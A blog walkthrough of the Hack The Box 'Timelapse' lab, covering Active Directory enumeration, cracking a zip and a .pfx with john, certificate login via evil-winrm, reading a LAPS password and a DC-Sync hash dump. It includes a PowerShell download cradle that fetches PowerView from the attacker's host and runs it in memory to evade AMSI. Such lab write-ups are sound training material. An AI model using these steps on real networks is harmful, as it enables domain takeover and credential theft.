+++
tags = ["Box", "HTB", "Easy", "Windows", "LDAP", "Active Directory", "LAPS", "pfx", "john"]
draft = false
title = "Timelapse HTB Walkthrough"
author = "bloodstiller"
date = 2024-11-11
toc = true
bold = true
next = true
+++

## Timelapse Hack The Box Walkthrough/Writeup: {#timelapse-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Timelapse>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Timelapse/scans/nmap  🍣 main  3GiB/7GiB | 268kiB/1GiB with /usr/bin/zsh
        🕙 22:16:09 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 22:16 GMT
        Nmap scan report for 10.129.227.113
        Host is up (0.040s latency).
        Not shown: 991 filtered tcp ports (no-response)
        PORT     STATE SERVICE
        53/tcp   open  domain
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        593/tcp  open  http-rpc-epmap
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl

        Nmap done: 1 IP address (1 host up) scanned in 4.41 seconds

        ```
    -   **Initial thoughts**:
        -   DNS
        -   Kerberos
        -   SMB
        -   LDAP
        -   RPC


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in content-org/Walkthroughs/HTB/BlogEntriesMade/Timelapse  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 22:22:24 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 06:14 GMT
    Stats: 0:02:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 77.90% done; ETC: 06:17 (0:00:35 remaining)
    Stats: 0:02:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
    Service scan Timing: About 11.76% done; ETC: 06:18 (0:00:45 remaining)
    Nmap scan report for 10.129.123.90
    Host is up (0.039s latency).
    Not shown: 65518 filtered tcp ports (no-response)
    PORT      STATE SERVICE           VERSION
    53/tcp    open  domain            Simple DNS Plus
    88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-11-11 14:17:46Z)
    135/tcp   open  msrpc             Microsoft Windows RPC
    139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
    389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ldapssl?
    3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
    3269/tcp  open  globalcatLDAPssl?
    5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_ssl-date: 2024-11-11T14:19:20+00:00; +8h00m00s from scanner time.
    | ssl-cert: Subject: commonName=dc01.timelapse.htb
    | Not valid before: 2021-10-25T14:05:29
    |_Not valid after:  2022-10-25T14:25:29
    | tls-alpn:
    |_  http/1.1
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  mc-nmf            .NET Message Framing
    49667/tcp open  msrpc             Microsoft Windows RPC
    49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
    49674/tcp open  msrpc             Microsoft Windows RPC
    49695/tcp open  msrpc             Microsoft Windows RPC
    49724/tcp open  msrpc             Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2019 (89%)
    Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required
    | smb2-time:
    |   date: 2024-11-11T14:18:40
    |_  start_date: N/A
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 262.82 seconds
    ```


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapire>
    -   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>
        -   `python3 /home/kali/windowsTools/enumeration/ldapire.py $box`
            -   It will dump general information &amp; also detailed &amp; simple information including:
                -   Groups
                -   Users
-   It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in HTB/BlogEntriesMade/Timelapse/scans/ldap  🍣 main  3GiB/7GiB | 268kiB/1GiB with /usr/bin/zsh
        🕙 22:17:33 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box
        Attempting to connect to 10.129.227.113 with SSL...
        Failed to connect with SSL.
        Attempting to connect to 10.129.227.113 with non-SSL...
        Connected successfully using anonymous bind. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=timelapse,DC=htb
            CN=Configuration,DC=timelapse,DC=htb
            CN=Schema,CN=Configuration,DC=timelapse,DC=htb
            DC=DomainDnsZones,DC=timelapse,DC=htb
            DC=ForestDnsZones,DC=timelapse,DC=htb
        ```

    2.  <span class="underline">We have the domain functionality level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=timelapse,DC=htb
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.)
            ```shell
            serverName:
                CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.


#### Updating ETC/HOSTS &amp; Variables: {#updating-etc-hosts-and-variables}

-   **Updated Domain &amp; Machine Variables for Testing**:
    -   Now that I have this information, I can update the `domain` and `machine` variables used in tests:
        -   `update_var domain "timelapse.htb"`
        -   `update_var machine "DC01"`

-   **Updating `/etc/hosts` for DNS and LDAP Queries**:
    -   I update my `/etc/hosts` file to enable tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration and other tools that require DNS or LDAP for queries:
        -   `echo "$box   $domain $machine.$domain" | sudo tee -a /etc/hosts`


#### Syncing Clocks for Kerberos Exploitation: {#syncing-clocks-for-kerberos-exploitation}

-   Since Kerberos is enabled on this host, it's best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
    -   `sudo ntpdate -s $domain`
    -   +Note+: I am doing this now as we have the DNS name etc.


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   {{< figure src="/ox-hugo/2024-11-10-153014_.png" >}}
    -   Nothing of note.


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   As kerberos is present we can enumerate users using [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
    -   {{< figure src="/ox-hugo/2024-11-10-152953_.png" >}}
    -   No hits


#### Using netexec for ASReproasting: {#using-netexec-for-asreproasting}

-   **We should always try and asreproast with a null/guest session as it can lead to an easy win**:
    -   `netexec ldap $box -u '' -p '' --asreproast asrep.txt`
    -   `netexec ldap $box -u guest -p '' --asreproast asrep.txt`
    -   Neither get hits.


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
        -   {{< figure src="/ox-hugo/2024-11-10-152454_.png" >}}
        -   We have read access to shares as the guest user.

    -   `netexec smb $box -u '' -p '' --shares`
        -   {{< figure src="/ox-hugo/2024-11-10-152616_.png" >}}
        -   Null session disabled.


#### Enumerating Users with Impacket-lookupsid: {#enumerating-users-with-impacket-lookupsid}

-   **We can use** `impacket-lookupsid` **to enumerate users on the domain**:
    -   `impacket-lookupsid $domain/guest@$machine.$domain -domain-sids`
    -   `impacket-lookupsid guest@$box -domain-sids -no-pass`
    -   +Note+: As we are using the "Guest" account we can just hit enter for a blank password
    -   {{< figure src="/ox-hugo/2024-11-10-153134_.png" >}}
    -   Interesting users, I will add them to my user list.


### Using smbclient to enumerate shares: {#using-smbclient-to-enumerate-shares}

-   `smbclient -U 'guest' "\\\\$box\\shares"`
-   {{< figure src="/ox-hugo/2024-11-10-153442_.png" >}}


### Finding LAPS related documentation on in the HelpDesk share: {#finding-laps-related-documentation-on-in-the-helpdesk-share}

-   **Searching the helpdesk share shows alot of LAPS related information**:
    -   {{< figure src="/ox-hugo/2024-11-10-153939_.png" >}}

-   **I download all the files**:
    -   {{< figure src="/ox-hugo/2024-11-10-154048_.png" >}}
    -   I check the documentation but it's all official documentation by microsoft.
    -   +Note+: This does not directly tell us anything however we can most likely infer that LAPS is in use on this box somewhere.


#### Local Administrator Password Solution (LAPS) Primer: {#local-administrator-password-solution--laps--primer}

-   **LAPS** is a Microsoft tool designed to manage and secure local administrator passwords on domain-joined machines by generating unique, random passwords.
-   **Purpose**: Prevents lateral movement and credential theft across systems by ensuring each machine has a unique local administrator password.
-   **How it Works**:
    -   Passwords are stored securely in **Active Directory (AD)** and tied to individual machines.
    -   Passwords are updated regularly based on **Group Policy settings**.
    -   Only authorized users/groups have access to these stored passwords.

-   **Key Features:**
    -   **Automatic Password Rotation**: Random passwords are generated and regularly updated, reducing exposure from old or reused passwords.
    -   **Secure Storage**: Passwords are stored in AD as an attribute of the computer object, protected by AD permissions.
    -   **Access Control**: Administrators can control who can view the passwords, ensuring limited and audited access.

-   **Benefits:**
    -   **Mitigates Lateral Movement**: Reduces the risk of a compromised local admin account being used to move laterally across systems.
    -   **Enhanced Security**: Unique passwords for each device eliminate risks associated with shared or default passwords.
    -   **Simplicity and Automation**: Password rotation and management are automated, decreasing administrative overhead.

-   **Common Use Cases:**
    -   Enforcing strong local admin credentials across enterprise environments.
    -   Reducing credential reuse and enhancing compliance for audits and regulatory standards.

-   **Limitations**:
    -   Only works on **domain-joined** Windows machines.
    -   Requires **Active Directory schema modification**, which may need approval from IT governance.


## 2. Foothold: {#2-dot-foothold}


### Finding a backup in the Dev share: {#finding-a-backup-in-the-dev-share}

-   **There is a file called** `winrm_backup.zip` **in the Dev share**:
    -   {{< figure src="/ox-hugo/2024-11-10-153547_.png" >}}

-   **I download it**:
    -   {{< figure src="/ox-hugo/2024-11-10-153618_.png" >}}

-   **I try and open the file but it's password protected**:
    -   {{< figure src="/ox-hugo/2024-11-10-154517_.png" >}}
    -   What is interesting is, is the fact that there is a `.pfx` cert in here, which should allow us to authenticate.


#### PFX Certificates in Windows: A Primer {#pfx-certificates-in-windows-a-primer}

**What's Inside a PFX File**:

-   A PFX file (also known as PKCS#12) is like a secure digital envelope containing two essential pieces:
    -   A public key that others use to encrypt data or verify your identity
    -   A private key that only you have, used to decrypt data or prove it's really you

-   **Why They Matter in Windows**:
    -   In the Windows world, PFX certificates handle several crucial security tasks:
        -   Securing web traffic through HTTPS
        -   Protecting Remote Desktop connections
        -   Enabling secure email in Outlook
        -   Verifying the authenticity of code and scripts
        -   Supporting Single Sign-On across applications

-   **How Windows Handles PFX Files**:
    -   Windows stores these certificates in its Certificate Store, which you can think of as a secure vault for your digital credentials. The system protects the private keys and manages access to them, while making the public certificates available when needed.

    -   Working with certificates in Windows is straightforward - the system provides built-in tools like the Certificate Import Wizard and Certificate Manager (certlm.msc) to handle PFX files. Once imported, Windows takes care of the heavy lifting of using these certificates for authentication and encryption.

<!--listend-->

-   **Important Considerations**:
    -   A few key points to keep in mind about PFX certificates in Windows:
        -   They're usually password-protected for additional security
        -   Windows can store them at either the user or machine level
        -   The system handles key storage security automatically
        -   Not all applications can use PFX format directly
        -   Managing multiple certificates across systems requires planning


### Cracking the encrypted zip file using zip2john &amp; john: {#cracking-the-encrypted-zip-file-using-zip2john-and-john}

-   As the zip file is password protected we can use zip2john to generate a hash we can then crack:
    -   `zip2john winrm_backup.zip >> winrm.hash`
    -   {{< figure src="/ox-hugo/2024-11-10-155523_.png" >}}

-   **Cracking the hash**:
    -   `john winrm.hash --wordlist=/home/kali/Wordlists/rockyou.txt`
    -   {{< figure src="/ox-hugo/2024-11-10-155552_.png" >}}
    -   It cracks

-   **Extracting the** `.pfx`:
    -   It works
    -   {{< figure src="/ox-hugo/2024-11-10-155724_.png" >}}


### Attempting to extract the private keys from the `.pfx`: {#attempting-to-extract-the-private-keys-from-the-dot-pfx}

-   Initially I try and extract the certificate &amp; key from the `pfx` but the password is not accepted:
    -   `openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legaccy_dev_auth.pem -nodes`
    -   {{< figure src="/ox-hugo/2024-11-10-160149_.png" >}}
    -   No dice.


### Cracking the `.pfx` using pfx2john &amp; john: {#cracking-the-dot-pfx-using-pfx2john-and-john}

-   Like the zip before we can crack this pfx file to extract the password.

-   **Generate a hash using** `pfx2john`
    -   `pfx2john legacyy_dev_auth.pfx >> pfx.hash`

-   **Crack**:
    -   `john pfx.hash --wordlist=/home/kali/Wordlists/rockyou.txt`
    -   {{< figure src="/ox-hugo/2024-11-10-160440_.png" >}}


### Extracting the private key &amp; certificate with openssl from a `.pfx`: {#extracting-the-private-key-and-certificate-with-openssl-from-a-dot-pfx}

-   **Extract the private key**:
    ```bash
    openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legaccy_dev_auth-priv-key.pem -nodes
    ```

    -   {{< figure src="/ox-hugo/2024-11-10-160919_.png" >}}

-   **Extract the certificate**:
    ```bash
    openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legaccy_dev_auth-cert.pem -nodes
    ```

    -   {{< figure src="/ox-hugo/2024-11-10-160954_.png" >}}


### Connecting with evil-winrm to the host using certificates: {#connecting-with-evil-winrm-to-the-host-using-certificates}

-   As we have extracted both the key and cert from the `.pfx` we can now authenticate with `evil-winrm`
    -   `evil-winrm -i $box -c legaccy_dev_auth-cert.pem -k legaccy_dev_auth-priv-key.pem -S`
    -   {{< figure src="/ox-hugo/2024-11-10-161634_.png" >}}
    -   +Note+: See how we used `S` for ssl as we are using cert based authentication.

-   **Grab our user flag**:
    -   {{< figure src="/ox-hugo/2024-11-10-162152_.png" >}}

-   **Check users on the host**:
    -   {{< figure src="/ox-hugo/2024-11-10-162240_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### General Enumeration: {#general-enumeration}


#### Check group membership: {#check-group-membership}

-   **I check what groups we are part of**:
    -   `whoami /groups`
    -   {{< figure src="/ox-hugo/2024-11-10-194407_.png" >}}


#### Check privileges: {#check-privileges}

-   **Check our privs**:
    -   `whoami /priv`
    -   {{< figure src="/ox-hugo/2024-11-10-194714_.png" >}}


### Checking PowerShell history: {#checking-powershell-history}

As our user is part of the legacy devs there may be some interesting information in their PowerShell history.

-   **Check the file exists**:
    -   `(Get-PSReadLineOption).HistorySavePath`
    -   {{< figure src="/ox-hugo/2024-11-10-201404_.png" >}}
    -   It does, lets download.

<!--listend-->

-   **I go to download it but it fails**:
    -   {{< figure src="/ox-hugo/2024-11-10-201624_.png" >}}

-   **I check the folder and can see the name of the file is actually** `ConsoleHost_history.txt`
    -   {{< figure src="/ox-hugo/2024-11-10-201758_.png" >}}

-   **I download it**:
    -   {{< figure src="/ox-hugo/2024-11-10-201832_.png" >}}


### Finding clear text credentials in the PowerShell history file: {#finding-clear-text-credentials-in-the-powershell-history-file}

-   Looking through the file I find the clear text creds for the `svc_deploy` service account:
    -   {{< figure src="/ox-hugo/2024-11-10-202015_.png" >}}

-   I test the creds &amp; they are valid:
    -   {{< figure src="/ox-hugo/2024-11-10-202350_.png" >}}


### Performing a bloodhound collection: {#performing-a-bloodhound-collection}

-   Now that we have some credentials we can perform a bloodhound collection.
    -   `bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box`
    -   {{< figure src="/ox-hugo/2024-11-10-202819_.png" >}}


### Finding out svc_deploy has ReadLAPSPassword privileges over the DC: {#finding-out-svc-deploy-has-readlapspassword-privileges-over-the-dc}

-   Looking at bloodhound we can see that we are part of the LAPS_READERS groups which has `ReadLAPSPassword` privileges over the DC01, so we can read the machines password.
    -   {{< figure src="/ox-hugo/2024-11-10-203131_.png" >}}


### Retrieving DC01 LAPS Password with PowerView via download cradle: {#retrieving-dc01-laps-password-with-powerview-via-download-cradle}

-   To avoid AMSI I decide to use `PowerView.ps1` with a download cradle. This means I can use a download cradle to load the script directly into memory without needing to download anything onto the host itself.
    -   +Note+: I know there are linux tool to extract the LAPS password however I wanted to use this methodology as an exercise.

-   **I stand up my python server**:
    -   `python3 -m http.server 9000`

<!--listend-->

-   **On the target from an evil-winrm admin shell I use a download cradle to load the sript into memory**:
    -   `iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/PowerView.ps1')`
    -   {{< figure src="/ox-hugo/2024-11-10-203907_.png" >}}
    -   {{< figure src="/ox-hugo/2024-11-10-203934_.png" >}}

<!--listend-->

-   **Let's create a secure string, using svc_deploy's creds**:
    ```powershell
    $SecPassword = ConvertTo-SecureString '[svc_password]' -AsPlainText -Force
    ```

    -   {{< figure src="/ox-hugo/2024-11-10-204304_.png" >}}

-   **Create Credential Object for Authentication**:
    ```powershell
    $Cred = New-Object System.Management.Automation.PSCredential('timelapse.htb\svc_deploy', $SecPassword)
    ```

    -   {{< figure src="/ox-hugo/2024-11-10-204346_.png" >}}

<!--listend-->

-   **Retrieve LAPS Password Using the Service Account**:
    ```powershell
    Get-DomainObject DC01 -Credential $Cred -Properties "ms-mcs-AdmPwd",name
    ```

    -   {{< figure src="/ox-hugo/2024-11-10-204410_.png" >}}
    -   +Note+: The LAPS password is stored in the "`ms-mcs-AdmPwd`" attribute.

-   **Now that we have the** `LAPS` **password we can authenticate as the administrator**:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-11-10-205437_.png" >}}

<!--listend-->

-   **Grabbing our flag**:
    -   `impacket-psexec $domain/$user@$box -hashes :$hash`
    -   There was no flag on the Administrators desktop.
        -   {{< figure src="/ox-hugo/2024-11-11-054537_.png" >}}
    -   Looking through the box though there are other users; as we have enumerated all other users desktop let's check out TRX.
        -   {{< figure src="/ox-hugo/2024-11-11-054635_.png" >}}
    -   Flag found:
        -   {{< figure src="/ox-hugo/2024-11-11-054723_.png" >}}
    -   +Note+:
        -   I had to use psexec as winrm stopped working (and continued to not work even after box resets)
        -   I had to actually perform this after the DC-Sync to retrieve the administrator hash as I could not use evil-winrm and the LAPS password to connect. I have since checked some known walktrhoughs and you should be able to authenticate so maybe I just got unlucky. So if you encounter the same issue, jump to my persistence section to view how to DC-Sync and then use the above approach.


## 4. Persistence: {#4-dot-persistence}


### Dumping NTDS.dit/DC-SYNC attack: {#dumping-ntds-dot-dit-dc-sync-attack}

-   **Perform DC-Sync attack using netexec**:
    -   `netexec smb $box -u $user -p $pass -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-11-10-205616_.png" >}}

-   **Extract all hashes from netexec**
    -   `for file in /home/kali/.nxc/logs/*.ntds; do cat "$file" | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\n'; done`
    -   {{< figure src="/ox-hugo/2024-11-10-205712_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned alot about extracting credentials from .pfx files. That was fun.
2.  I learned that even if the box is being finnicky there will be a way to work around it.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Not terrible this time. Nothing to write home about.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


